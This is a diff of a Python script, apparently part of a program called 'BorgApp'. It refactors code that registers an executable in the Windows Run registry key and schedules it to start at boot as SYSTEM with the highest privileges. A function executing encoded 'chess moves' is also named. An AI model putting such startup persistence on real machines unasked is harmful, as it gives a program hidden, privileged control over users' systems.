@@ -56,36 +56,35 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
 # Function to add the executable to Windows startup and Task Scheduler
 def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
     try:
-        # Add to Windows startup via registry
+        # Step 1: Add to Windows startup via registry
         try:
-            # Open or create the registry key for the current user's startup programs
-            key = winreg.OpenKey(
+            # Open the registry key for the current user's startup programs, or create it if it doesn't exist
+            with winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                 0,
                 winreg.KEY_SET_VALUE
-            )
-            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
-            winreg.CloseKey(key)
-            print(f"Successfully added {executable_path} to registry startup.")
+            ) as key:
+                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
+                print(f"Successfully added {executable_path} to registry startup.")
 
             # Verify the registry key value
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-            value, _ = winreg.QueryValueEx(key, app_name)
-            winreg.CloseKey(key)
-            print(f"Registry Key Value for {app_name}: {value}")
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
+                value, _ = winreg.QueryValueEx(key, app_name)
+                print(f"Registry Key Value for {app_name}: {value}")
+
         except Exception as e:
             print(f"Failed to add {executable_path} to registry startup: {e}")
             print(traceback.format_exc())
+            return  # Exit early if registry setup fails
 
-        # Task Scheduler using the registry entry for the path to 'borg.exe'
-        # The command will use the value from the registry for the task's executable path
-        if value:
+        # Step 2: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
+        if value:  # Ensure we successfully retrieved the registry value
             cmd = [
                 'schtasks', '/Create', '/F',
                 '/SC', 'ONSTART',  # Trigger on system startup
                 '/TN', app_name,  # Task name
-                '/TR', f'"{value}"',  # Use the value from the registry
+                '/TR', f'"{value}"',  # Use the path from the registry
                 '/RU', 'SYSTEM',  # Run as SYSTEM user to ensure elevated privileges
                 '/RL', 'HIGHEST'  # Run with highest privileges
             ]
